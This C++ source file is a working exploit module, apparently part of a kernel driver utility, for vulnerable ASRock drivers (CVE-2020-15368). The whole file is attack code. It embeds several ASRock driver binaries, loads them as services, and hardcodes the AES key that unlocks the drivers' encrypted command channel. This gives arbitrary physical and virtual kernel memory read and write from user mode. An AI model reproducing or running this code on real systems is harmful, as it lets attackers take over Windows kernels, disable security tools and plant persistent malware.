/* ASRock driver exploit - Supports AsrDrv106, AppShopDrv103, and AsrDrv107 */

#include <windows.h>
#include <bcrypt.h>
#include <cstdint>
#include <expected>
#include <memory>
#include <string>
#include <vector>

#include "../../core/kdu_core.h"
#include "shared/ntos/ntos.h"

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

// External symbols from bin2obj
extern "C" {
    extern const uint8_t _binary_AsrDrv106_bin_start[];
    extern const uint8_t _binary_AsrDrv106_bin_end[];
    extern const uint8_t _binary_AppShopDrv103_bin_start[];
    extern const uint8_t _binary_AppShopDrv103_bin_end[];
    extern const uint8_t _binary_AsrDrv107_bin_start[];
    extern const uint8_t _binary_AsrDrv107_bin_end[];
    extern const uint8_t _binary_AsrDrv107n_bin_start[];
    extern const uint8_t _binary_AsrDrv107n_bin_end[];
    extern const uint8_t _binary_AxtuDrv_bin_start[];
    extern const uint8_t _binary_AxtuDrv_bin_end[];
}

namespace kdu::exploits {

#define ASROCK_AES_KEY "C110DD4FE9434147B92A5A1E3FDBF29A"
#define ASROCK_AES_KEY_LENGTH (sizeof(ASROCK_AES_KEY) - 1)

#define ASRDRV_READ_MEMORY (DWORD)0xA02
#define ASRDRV_WRITE_MEMORY (DWORD)0xA03
#define ASRDRV_EXEC_DISPATCH (DWORD)0xB00

#define IOCTL_ASRDRV_EXEC_DISPATCH                                       \
    CTL_CODE(FILE_DEVICE_UNKNOWN, ASRDRV_EXEC_DISPATCH, METHOD_BUFFERED, \
             FILE_READ_ACCESS | FILE_WRITE_ACCESS)

#define IOCTL_ASRDRV_READ_MEMORY                                       \
    CTL_CODE(FILE_DEVICE_UNKNOWN, ASRDRV_READ_MEMORY, METHOD_BUFFERED, \
             FILE_READ_ACCESS | FILE_WRITE_ACCESS)

#define IOCTL_ASRDRV_WRITE_MEMORY                                       \
    CTL_CODE(FILE_DEVICE_UNKNOWN, ASRDRV_WRITE_MEMORY, METHOD_BUFFERED, \
             FILE_READ_ACCESS | FILE_WRITE_ACCESS)

#define IOCTL_RWDRV_READ_MEMORY                                        \
    CTL_CODE(FILE_DEVICE_UNKNOWN, ASRDRV_READ_MEMORY, METHOD_BUFFERED, \
             FILE_ANY_ACCESS)

#define IOCTL_RWDRV_WRITE_MEMORY                                        \
    CTL_CODE(FILE_DEVICE_UNKNOWN, ASRDRV_WRITE_MEMORY, METHOD_BUFFERED, \
             FILE_ANY_ACCESS)

#define IOCTL_RWDRV_READ_MEMORY_7N                                     \
    CTL_CODE(FILE_DEVICE_UNKNOWN, ASRDRV_READ_MEMORY, METHOD_BUFFERED, \
             FILE_READ_ACCESS | FILE_WRITE_ACCESS)

#define IOCTL_RWDRV_WRITE_MEMORY_7N                                     \
    CTL_CODE(FILE_DEVICE_UNKNOWN, ASRDRV_WRITE_MEMORY, METHOD_BUFFERED, \
             FILE_READ_ACCESS | FILE_WRITE_ACCESS)

#pragma pack(push, 1)
typedef struct _ASRDRV_REQUEST {
    WORD Pad0;
    DWORD SizeOfIv;
    BYTE Iv[21];
    BYTE Key[16];
    BYTE Pad1[3];
} ASRDRV_REQUEST, *PASRDRV_REQUEST;

typedef struct _ASRDRV_REQUEST_FOOTER {
    ULONG Size;
    WORD Pad0;
} ASRDRV_REQUEST_FOOTER, *PASRDRV_REQUEST_FOOTER;

typedef enum _ASRDRV_MM_GRANULARITY {
    AsrGranularityByte = 0,
    AsrGranularityWord = 1,
    AsrGranularityDword = 2
} ASRDRV_MM_GRANULARITY;

typedef union _ASRDRV_ARGS {
    BYTE byteArgs[24];
    WORD wordArgs[12];
    DWORD dwordArgs[6];
    UINT64 qwordArgs[3];
} ASRDRV_ARGS;

typedef struct _ASRDRV_COMMAND {
    UINT OperationCode;
    INT Pad0;
    ASRDRV_ARGS Arguments;
} ASRDRV_COMMAND, *PASRDRV_COMMAND;

typedef struct _ASR_RWE_REQUEST {
    LARGE_INTEGER Address;
    ULONG Size;
    ASRDRV_MM_GRANULARITY Granularity;
    PVOID Data;
} ASR_RWE_REQUEST, *PASR_RWE_REQUEST;
#pragma pack(pop)

class AsrockExploit : public core::DriverExploit,
                      public core::IPhysicalMemoryRead,
                      public core::IPhysicalMemoryWrite,
                      public core::QueryPML4FromPhysicalMixin<AsrockExploit>,
                      public core::V2PFromPhysicalMixin<AsrockExploit>,
                      public core::VirtualFromPhysicalMixin<AsrockExploit> {
public:
    using DriverExploit::DriverExploit;

    std::expected<std::vector<uint8_t>, std::string>
    try_read_physical_memory(uintptr_t physical_address, size_t size) const noexcept override {
        ASRDRV_ARGS args{};
        std::vector<uint8_t> buffer(size);

        args.qwordArgs[0] = physical_address;
        args.dwordArgs[2] = (DWORD)size;
        args.dwordArgs[3] = AsrGranularityDword;
        args.qwordArgs[2] = (DWORD64)buffer.data();

        if (!asr_call_driver(IOCTL_ASRDRV_READ_MEMORY, &args)) {
            return std::unexpected("Failed to call Asrock driver for physical read");
        }

        return buffer;
    }

    std::expected<void, std::string>
    try_write_physical_memory(uintptr_t physical_address, const void* data, size_t size) noexcept override {
        ASRDRV_ARGS args{};

        args.qwordArgs[0] = physical_address;
        args.dwordArgs[2] = (DWORD)size;
        args.dwordArgs[3] = AsrGranularityByte;
        args.qwordArgs[2] = (DWORD64)data;

        if (!asr_call_driver(IOCTL_ASRDRV_WRITE_MEMORY, &args)) {
            return std::unexpected("Failed to call Asrock driver for physical write");
        }

        return {};
    }

private:
    bool asr_call_driver(ULONG ioctl_code, ASRDRV_ARGS* args) const {
        ASRDRV_COMMAND command{};
        command.OperationCode = ioctl_code;
        memcpy(&command.Arguments, args, sizeof(ASRDRV_ARGS));

        void* encrypted_data = nullptr;
        ULONG encrypted_size = 0;

        if (!encrypt_request((PUCHAR)&command, sizeof(command), &encrypted_data, &encrypted_size)) {
            return false;
        }

        uint8_t out_buffer[PAGE_SIZE];
        bool result = call_driver(device_handle_, IOCTL_ASRDRV_EXEC_DISPATCH,
                                 encrypted_data, encrypted_size,
                                 out_buffer, sizeof(out_buffer));

        HeapFree(GetProcessHeap(), 0, encrypted_data);
        return result;
    }

    bool encrypt_request(PUCHAR data, ULONG size, void** out_data, ULONG* out_size) const {
        BCRYPT_ALG_HANDLE hAlg = nullptr;
        BCRYPT_KEY_HANDLE hKey = nullptr;
        bool success = false;

        ASRDRV_REQUEST request{};
        request.SizeOfIv = sizeof(request.Iv);
        memset(request.Iv, 69, sizeof(request.Iv));
        memset(request.Key, 69, sizeof(request.Key));

        BYTE encKey[32];
        memcpy(encKey, ASROCK_AES_KEY, ASROCK_AES_KEY_LENGTH);
        memcpy(&encKey[13], request.Key, sizeof(request.Key));

        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0) == 0) {
            if (BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, encKey, sizeof(encKey), 0) == 0) {
                BYTE iv[sizeof(request.Iv)];
                memcpy(iv, request.Iv, sizeof(iv));

                ULONG cbCipher = size + 64;
                PBYTE pbCipher = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbCipher);
                if (pbCipher) {
                    ULONG cbResult = 0;
                    if (BCryptEncrypt(hKey, data, size, nullptr, iv, sizeof(iv), pbCipher, cbCipher, &cbResult, BCRYPT_BLOCK_PADDING) == 0) {
                        ULONG final_size = sizeof(ASRDRV_REQUEST) + cbResult + sizeof(ASRDRV_REQUEST_FOOTER);
                        PBYTE result = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, final_size);
                        if (result) {
                            memcpy(result, &request, sizeof(request));
                            memcpy(result + sizeof(request), pbCipher, cbResult);
                            
                            auto* footer = (ASRDRV_REQUEST_FOOTER*)(result + final_size - sizeof(ASRDRV_REQUEST_FOOTER));
                            footer->Size = cbResult;

                            *out_data = result;
                            *out_size = final_size;
                            success = true;
                        }
                    }
                    HeapFree(GetProcessHeap(), 0, pbCipher);
                }
                BCryptDestroyKey(hKey);
            }
            BCryptCloseAlgorithmProvider(hAlg, 0);
        }

        return success;
    }
};

class AsrRweExploit : public core::DriverExploit,
                      public core::IPhysicalMemoryRead,
                      public core::IPhysicalMemoryWrite,
                      public core::QueryPML4FromPhysicalMixin<AsrRweExploit>,
                      public core::V2PFromPhysicalMixin<AsrRweExploit>,
                      public core::VirtualFromPhysicalMixin<AsrRweExploit> {
    DWORD read_ioctl_;
    DWORD write_ioctl_;

public:
    AsrRweExploit(HANDLE device_handle, std::wstring name, DWORD read_ioctl, DWORD write_ioctl)
        : DriverExploit(device_handle, std::move(name)), read_ioctl_(read_ioctl), write_ioctl_(write_ioctl) {}

    std::expected<std::vector<uint8_t>, std::string>
    try_read_physical_memory(uintptr_t physical_address, size_t size) const noexcept override {
        ASR_RWE_REQUEST request{};
        std::vector<uint8_t> buffer(size);

        request.Address.QuadPart = physical_address  & ~(PAGE_SIZE - 1);
        request.Size = (ULONG)ALIGN_UP_BY(size, PAGE_SIZE);
        request.Granularity = AsrGranularityDword;
        request.Data = buffer.data();

        if (!call_driver(device_handle_, read_ioctl_, &request, sizeof(request), &request, sizeof(request))) {
            return std::unexpected("Failed to call Asrock RWE driver for physical read");
        }

        return buffer;
    }

    std::expected<void, std::string>
    try_write_physical_memory(uintptr_t physical_address, const void* data, size_t size) noexcept override {
        ASR_RWE_REQUEST request{};

        request.Address.QuadPart = physical_address;
        request.Size = (ULONG)size;
        request.Granularity = AsrGranularityByte;
        request.Data = (PVOID)data;

        if (!call_driver(device_handle_, write_ioctl_, &request, sizeof(request), &request, sizeof(request))) {
            return std::unexpected("Failed to call Asrock RWE driver for physical write");
        }

        return {};
    }
};

// Provider base template
template<typename TExploit, const uint8_t* Start, const uint8_t* End, const char* Name, const char* Device, const char* Service, const char* Desc, DWORD ReadIoctl = 0, DWORD WriteIoctl = 0>
class AsrockProviderBase : public core::IDriverProvider {
public:
    AsrockProviderBase() {
        metadata_.driver_name = Name;
        metadata_.device_name = Device;
        metadata_.service_name = Service;
        metadata_.description = Desc;
        metadata_.cve_id = "CVE-2020-15368";
        metadata_.driver_data = Start;
        metadata_.driver_size = (size_t)(End - Start);
        metadata_.capabilities = 
            core::AbilityFlags::PhysicalMemoryRead |
            core::AbilityFlags::PhysicalMemoryWrite |
            core::AbilityFlags::VirtualMemoryRead |
            core::AbilityFlags::VirtualMemoryWrite |
            core::AbilityFlags::VirtualToPhysical |
            core::AbilityFlags::QueryPML4;
    }

    std::expected<void, std::string> check_available() const noexcept override {
        HANDLE hDevice = CreateFileA(metadata_.device_name.c_str(),
                                   GENERIC_READ | GENERIC_WRITE,
                                   0, nullptr, OPEN_EXISTING,
                                   FILE_ATTRIBUTE_NORMAL, nullptr);
        
        if (hDevice != INVALID_HANDLE_VALUE) {
            CloseHandle(hDevice);
            return {};
        }
        
        if (!metadata_.driver_data || metadata_.driver_size == 0) {
            return std::unexpected("Driver binary not embedded");
        }
        
        return {};
    }

    std::expected<std::unique_ptr<core::DriverExploit>, std::string>
    create_instance() noexcept override {
        std::wstring service_name(metadata_.service_name.begin(), 
                                 metadata_.service_name.end());
        std::wstring device_name(metadata_.device_name.begin(), 
                                metadata_.device_name.end());
        
        auto result = load_driver_from_memory(
            metadata_.driver_data,
            metadata_.driver_size,
            service_name,
            device_name
        );
        
        if (!result) {
            return std::unexpected(result.error());
        }

        if constexpr (std::is_same_v<TExploit, AsrRweExploit>) {
            return std::make_unique<TExploit>(*result, 
                std::wstring(metadata_.driver_name.begin(), metadata_.driver_name.end()),
                ReadIoctl, WriteIoctl);
        } else {
             return std::make_unique<TExploit>(*result, 
                std::wstring(metadata_.driver_name.begin(), metadata_.driver_name.end()));
        }
    }
};

// Specific providers definitions
namespace names {
    inline constexpr char AsrockName[] = "asrock";
    inline constexpr char AsrockDevice[] = "\\\\.\\AsrDrv106";
    inline constexpr char AsrockService[] = "AsrDrv106";
    inline constexpr char AsrockDesc[] = "ASRock IO Driver (AsrDrv106)";

    inline constexpr char Asrock2Name[] = "asrock2";
    inline constexpr char Asrock2Device[] = "\\\\.\\AxtuDrv";
    inline constexpr char Asrock2Service[] = "AxtuDrv";
    inline constexpr char Asrock2Desc[] = "ASRock Axtu Driver (AxtuDrv)";

    inline constexpr char Asrock3Name[] = "asrock3";
    inline constexpr char Asrock3Device[] = "\\\\.\\AppShopDrv103";
    inline constexpr char Asrock3Service[] = "AppShopDrv103";
    inline constexpr char Asrock3Desc[] = "ASRock AppShop Driver (AppShopDrv103)";

    inline constexpr char Asrock4Name[] = "asrock4";
    inline constexpr char Asrock4Device[] = "\\\\.\\AsrDrv107n";
    inline constexpr char Asrock4Service[] = "AsrDrv107n";
    inline constexpr char Asrock4Desc[] = "ASRock IO Driver (AsrDrv107n)";

    inline constexpr char Asrock5Name[] = "asrock5";
    inline constexpr char Asrock5Device[] = "\\\\.\\AsrDrv107";
    inline constexpr char Asrock5Service[] = "AsrDrv107";
    inline constexpr char Asrock5Desc[] = "ASRock IO Driver (AsrDrv107)";
}

using AsrockProvider = AsrockProviderBase<AsrockExploit, _binary_AsrDrv106_bin_start, _binary_AsrDrv106_bin_end, 
                                        names::AsrockName, names::AsrockDevice, names::AsrockService, names::AsrockDesc>;
static core::ProviderRegistrar<AsrockProvider> reg_asrock;

using Asrock2Provider = AsrockProviderBase<AsrRweExploit, _binary_AxtuDrv_bin_start, _binary_AxtuDrv_bin_end, 
                                        names::Asrock2Name, names::Asrock2Device, names::Asrock2Service, names::Asrock2Desc,
                                        IOCTL_RWDRV_READ_MEMORY, IOCTL_RWDRV_WRITE_MEMORY>;
static core::ProviderRegistrar<Asrock2Provider> reg_asrock2;

using Asrock3Provider = AsrockProviderBase<AsrockExploit, _binary_AppShopDrv103_bin_start, _binary_AppShopDrv103_bin_end, 
                                         names::Asrock3Name, names::Asrock3Device, names::Asrock3Service, names::Asrock3Desc>;
static core::ProviderRegistrar<Asrock3Provider> reg_asrock3;

using Asrock4Provider = AsrockProviderBase<AsrRweExploit, _binary_AsrDrv107n_bin_start, _binary_AsrDrv107n_bin_end, 
                                        names::Asrock4Name, names::Asrock4Device, names::Asrock4Service, names::Asrock4Desc,
                                        IOCTL_RWDRV_READ_MEMORY_7N, IOCTL_RWDRV_WRITE_MEMORY_7N>;
static core::ProviderRegistrar<Asrock4Provider> reg_asrock4;

using Asrock5Provider = AsrockProviderBase<AsrockExploit, _binary_AsrDrv107_bin_start, _binary_AsrDrv107_bin_end, 
                                         names::Asrock5Name, names::Asrock5Device, names::Asrock5Service, names::Asrock5Desc>;
static core::ProviderRegistrar<Asrock5Provider> reg_asrock5;

} // namespace kdu::exploits
